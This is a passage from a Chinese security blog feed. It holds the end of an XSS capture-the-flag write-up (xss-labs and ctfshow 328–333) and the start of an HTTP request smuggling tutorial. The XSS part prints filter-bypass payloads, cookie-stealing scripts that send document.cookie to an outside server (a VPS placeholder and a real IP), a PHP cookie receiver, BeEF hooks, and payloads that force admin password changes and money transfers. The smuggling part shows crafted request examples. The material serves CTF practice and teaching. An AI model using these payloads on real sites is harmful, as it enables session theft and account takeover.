type=”text” onmouseover=alert() “</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726230555125.png"></p><p>鼠标划过文本框</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210726230610328.png"></p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>仍然使用上一关的方法</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728171409093.png"></p><p>发现被实例化  这个t_ref参数怎么利用 url里传好像传不进去</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728173918864.png"></p><p>但是从这里可以发现ref应该是refer</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174023540.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174042560.png"></p><p>一传进去就是出现文本框了<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174109292.png"></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174639889.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174626300.png"></p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>理所当然的<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728174839524.png"></p><p>额没有反应 抓包！<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210728211436470.png"></p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210802013507101.png"></p><p>被替换为空格 注意空格和空字符不一样 尝试了大小写无效</p><p>尝试图片标签 </p><blockquote><p>keyword=&lt;img src=1 οnerrοr=alert()&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210802013807695.png"></p><p>可见 空格被实体化了 %0a绕过</p><blockquote><p>&lt;img%0asrc=1%0aonerror=alert()&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210802014135142.png"></p><h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><p>xss平台代码插入后提示不是管理员，说明我们不能插自己，得插管理员</p><p>payload：</p><blockquote><p>&lt;scrpit&gt;document.location.href=’<a href="http://vps/getcookie.php?cookie=&#39;+document.cookie\">http://vps/getcookie.php?cookie=&#39;+document.cookie\</a>&lt;/script&gt;</p><p>&lt;body onload=”document.location.href=’<a href="http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\">http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\</a>&lt;/body&gt;</p></blockquote><p>getcookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Cookie</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$Cookie</span>))&#123;<br><span class="hljs-variable">$action</span> = fopoen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;The file create failed!&quot;</span>);<br>fwrite(<span class="hljs-variable">$action</span>,<span class="hljs-variable">$Cookie</span>,<span class="hljs-string">&quot;\n&quot;</span>);<br>fclose(<span class="hljs-variable">$Cookie</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The Cookie has dump!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Nothing input!&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>ctfshow328</li></ul><p>查看功能点，注册，登录，均不能查看到flag，需要管理员登录</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021195236357.png"></p><p>我们注册一个密码获得cookie</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021195756121.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021195828394.png"></p><p>在浏览器伪造一下cookie，我们只看到了一闪而过的页面，然后就到了我们脚本的回显，说面是执行成功的，我们抓包看一下</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021200724719.png"></p><p>对比得知，这里还有请求包才对，我们要抓取这个请求包，并且防止它跳转</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021195949954.png"></p><p>询问出题人得知，这里采用了database，js获取ajax，所以说明这里发包后还有一个包没有获得，我们直接在proxy模块一个一个抓</p><p>在发送了管理员cookie后，把第一个包放掉，把js请求ajax请求的包抓取下来</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021200228393.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021200412268.png"></p><p>可以从控制台的性能(启用高级绘制插桩，设置cpu和网络倍速)里面查看到一闪而过的画面，我们在时间轴可以看到</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021210045312.png"></p><p>此时还有一个请求</p><ul><li>ctfshow 329</li></ul><p>登录后就注销掉当前cookie，从而没有办法用所获得的cookie进行登录，我们直接xss读取源码发送到vps上接受</p><p>先在表中插入一个数据，然后控制台尝试输出他的属性，为后面构造payload做准备</p><p>这里使用了jquery的遍历</p><blockquote><p>&lt;script&gt;$(‘.laytable-cell-1-0-1’).each(function(index,value){if(value.innerHTML.indexOf(‘ctf’+’show{‘)&gt;-1){window.location.href=”<a href="http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;%7D%7D);%5C">http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;}});\</a>&lt;/script&gt;</p></blockquote><ul><li>ctfshow 330、331</li></ul><p>有个修改密码的功能，抓包<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211024144417192.png"></p><p>很自然的想法就是让管理员发出这个包，然后以123456登录即可</p><p>注册一个密码</p><blockquote><p>&lt;script&gt;window.location.href=’<a href="http://127.0.0.1/api/change.php?p=123456&#39;;\">http://127.0.0.1/api/change.php?p=123456&#39;;\</a>&lt;/script&gt;</p></blockquote><p>没有用，再看一看题目很贴心的告诉你应该放在用户名里<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211024145254601.png"></p><p>用admin-123456成功登录</p><ul><li>ctfshow332</li></ul><p>注册登录一个账号，给admin转账-10000即可(有毒，我怎么搞都是有内鬼)</p><p>终于成功了</p><ul><li>ctfshow333</li></ul><p>332的基础上不能转负数了</p><p>可以给自己转，每次的转账金额不能大于当前的金额</p><p>比如：转账1元，bp抓一下，爆破1000次(1005），再改一下转账参数为1000，爆破10次</p><p>或者：</p><p>注册两个账号，其中一个账号的账号为：</p><blockquote><p>&lt;script&gt; $.ajax({url:’<a href="http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\">http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\</a>&lt;/script&gt;</p></blockquote><h2 id="xss的攻防："><a href="#xss的攻防：" class="headerlink" title="xss的攻防："></a>xss的攻防：</h2><h3 id="常用HTML标签"><a href="#常用HTML标签" class="headerlink" title="常用HTML标签"></a>常用HTML标签</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">iframe</span>&gt;    <span class="hljs-selector-tag">iframe</span> 元素会创建包含另一个文档的内联框架。<br><br>&lt;<span class="hljs-selector-tag">textarea</span>&gt;   <span class="hljs-selector-tag">textarea</span> 标签定义多行的文本输入控件<br><br>&lt;<span class="hljs-selector-tag">img</span>&gt;        <span class="hljs-selector-tag">img</span>  元素向网页中嵌入图像。<br><br>&lt;script&gt;     script 标签用于定义客户端脚本，比如javascript.<br>             script 元素既可以包含脚本语句，也可以通过 <span class="hljs-attribute">src</span> 属性指向外部脚本文件。<br>             必须的 type 属性规定脚本的 MIME 类型<br>             javascript 的常见应用是图像操作、表单验证以及动态内容更新。<br></code></pre></td></tr></table></figure><h3 id="常用javascript方法"><a href="#常用javascript方法" class="headerlink" title="常用javascript方法"></a>常用javascript方法</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">alert        alert() 方法用于显示带有一条指定消息和一个确认按钮的警告框。<br><br>window.<span class="hljs-keyword">location</span>   <span class="hljs-title">用于获得当前页面的地址url</span>，并把浏览器重定向到新的页面。<br><br>location.href     返回当前显示的文档的完整 URL<br><br>onload            一张页面或一幅图像完成加载<br><br>onsubmit           确认按钮被点击<br><br>onerror            在加载文档或图像时发生错误<br></code></pre></td></tr></table></figure><h3 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs xml">弹窗警告<br>此脚本实现弹窗框提示，一般作为漏洞测试或者演示使用，类似SQL注入测试中的单引号，一旦脚本能执行，也就意味着后端服务器没有对特殊字符做过滤 <span class="hljs-tag">&lt;&gt;</span> \ &#x27; ,这样就可以证明，这个页面存在xss漏洞。<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>页面嵌套<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">300</span> <span class="hljs-attr">height</span>=<span class="hljs-string">300</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">0</span> <span class="hljs-attr">height</span>=<span class="hljs-string">0</span> <span class="hljs-attr">border</span>=<span class="hljs-string">0</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>页面重定向<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">windows.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>弹窗警告并重定向<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;hello world!&quot;</span>);location.href=<span class="hljs-string">&quot;http:/www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>访问恶意代码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.xxx.com/xx.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>可结合 beef 收集用户cookie<br><br>巧用图片标签<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://BeFF_IP:3000/book.js&quot;</span>&gt;</span><br><br>绕开过滤的脚本<br>大小写 <span class="hljs-tag">&lt;<span class="hljs-name">ScRIpt</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">ScRiPT</span>&gt;</span><br>字符编码  采用URL、Base64 等编码<br>javasc<span class="hljs-symbol">&amp;#x72;</span>ipt:alert(123)<br><br>收集用户cookie<br>打开新窗口并且采用本地cookie访问目标页，<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&quot;http://www.baidu.com/cookie.php?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie<span class="hljs-string">&quot;)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/cookie.php?cookie=<span class="hljs-string">&quot;+document.cookie&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/img&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;iframe src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/iframe&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;script&gt;new Image().src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie;img.width=0;img.height=0;&lt;/script&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.利用&lt;&gt;标记，构造&lt;script&gt;标签可执行javascript的xss代码。</p><p>xss过滤函数需过滤&lt;&gt;&lt;script&gt;&lt;/script&gt;等字符。</p><p>2.利用html标签属性支持javascript:伪协议（支持标签属性的有href、lowsrc、bgsound、background、value、action、dynsrc等），执行xss代码。</p><p>xss 过滤函数需过滤JavaScript等关键字。</p><p>3.利用javascript在引号中只用分号分隔单词或强制语句结束，用换行符忽略分号强制结束一个完整语句，而忽略回车、空格、tab等键，绕过对javascript的关键字的过滤。</p><p>4.利用html标签属性值支持ascii码，对标签属性值进行转码进行规则库的绕过。</p><p>xss 过滤函数需过滤&amp;#\等字符。</p><p>5.利用事件处理函数，触发事件，执行xss代码。例如<code>&lt;img src=&#39;#&#39; onerror=alert(/xss/)&gt;</code>,当浏览器响应页面时，找不到图片的地址，触发onerror事件。</p><p>6.利用css执行javascript代码</p><blockquote><p>css代码中利用expression触发xss漏洞。如下所示：</p><p>&lt;div style=”width: expression(alert(‘xss’));&gt;</p><p>&lt;img src=”#” style=”xss:expression(alert(/xss/));”&gt;</p><p>&lt;style&gt;body {background-image:expression(alert(“xss”));}&lt;/style&gt;</p><p>&lt;div style=”list-style-image:url(javascript:alert(‘xss’))”&gt;</p><p>css代码中利用@import触发xss</p><p>&lt;stytle&gt;</p><p>@import ‘javascript:alert(“XSS”)’;</p><p>&lt;/stytle&gt;</p><p>css代码中使用@import和link方式导入外部含有xss代码的样式表文件</p><p>&lt;link rel=”stytlesheet” href=”<a href="http://www.***.com/a.css&quot;&gt;">http://www.***.com/a.css&quot;&gt;</a></p><p>&lt;stytle type=’text/css’&gt;@import url(<a href="http://www.*.com/a.css);/">http://www.*.com/a.css);\</a></style></p><p>xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字。</p></blockquote><p>7.利用大小写混淆、使用单引号、不使用引号、使用/插入在img src中间、构造不同的全角字符、运用/**/混淆过滤规则来绕过过滤函数</p><p>8.利用字符编码。javascript支持unicode、escapes、十六进制、八进制等编码形式。</p><img src='#' onerror=alert(/hacked/)>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP走私攻击</title>
    <link href="/2021/06/04/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"/>
    <url>/2021/06/04/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-HTTP请求走私是什么"><a href="#0x01-HTTP请求走私是什么" class="headerlink" title="0x01 HTTP请求走私是什么"></a>0x01 HTTP请求走私是什么</h3><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><h3 id="0x02-为什么会产生HTTP请求走私"><a href="#0x02-为什么会产生HTTP请求走私" class="headerlink" title="0x02 为什么会产生HTTP请求走私"></a>0x02 为什么会产生HTTP请求走私</h3><p><strong>请求走私漏洞成因</strong></p><blockquote><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p></blockquote><p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。<br> 同时使用两种不同的方法时，<code>Content-Length</code>无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为<code>Content-Length</code>的长度有效，有些以<code>Transfer-Encoding</code>有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。</p><p><strong>RFC2616规范</strong></p><blockquote><p>如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。</p></blockquote><p>由于规范默许可以使用<code>Transfer-Encoding</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。</p><p><strong>走私攻击实现</strong><br> 当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p><h4 id="扩展：为什么会出现多次请求"><a href="#扩展：为什么会出现多次请求" class="headerlink" title="扩展：为什么会出现多次请求"></a>扩展：为什么会出现多次请求</h4><p>这与最为广泛的HTTP 1.1的协议特性——<code>Keep-Alive&amp;Pipeline</code>有关。<br> 在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。<br> 而现代的Web页面是由多种资源组成的，要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种资源，如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p><strong>Keep-Alive</strong>：在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭<code>TCP链接</code>，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在<code>HTTP1.1</code>中默认开启的。<br> **Pipeline(http管线化)**：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的<code>HTTP</code>请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>现在，浏览器默认不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。<br> 下面这是典型的CDN加速图和拓扑结构图<br> CDN加速图<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191027233501-56f060b8-f8cf-1.jpg"><br> 拓扑结构图<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191027233515-5f360af2-f8cf-1.png"></p><h3 id="0x03-如何执行HTTP请求走私攻击"><a href="#0x03-如何执行HTTP请求走私攻击" class="headerlink" title="0x03 如何执行HTTP请求走私攻击"></a>0x03 如何执行HTTP请求走私攻击</h3><p>HTTP请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><blockquote><p>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。<br> TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。<br> TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p></blockquote><h3 id="0x04-HTTP请求走私攻击的五种方式"><a href="#0x04-HTTP请求走私攻击的五种方式" class="headerlink" title="0x04 HTTP请求走私攻击的五种方式"></a>0x04 HTTP请求走私攻击的五种方式</h3><h4 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h4><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br> 前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p><strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 44<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">\r\n`是换行的意思，windows的换行是`\r\n`，unix的是`\n`，mac的是`\r<br></code></pre></td></tr></table></figure></blockquote><p><strong>攻击流程</strong>：<br> 前端服务器收到该请求，读取<code>Content-Length</code>，判断这是一个完整的请求。<br> 然后转发给后端服务器，后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，后端服务器就认为这是收到了两个请求，分别是：</p><p>第一个：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>第二个：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>所以造成了请求走私。</p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p><strong>RFC7230规范</strong></p><blockquote><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p></blockquote><p>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br> 但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 7<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>12345<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br> 而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。<br> 如果此时有一个其他的正常用户对服务器进行了请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aGET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>这时，用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p><p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br> 所以想到前面所说的<br> <strong>RFC2616规范</strong></p><blockquote><p>如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。</p></blockquote><p>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。</p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</p><p><strong>chunk传输数据(size的值由16进制表示)</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 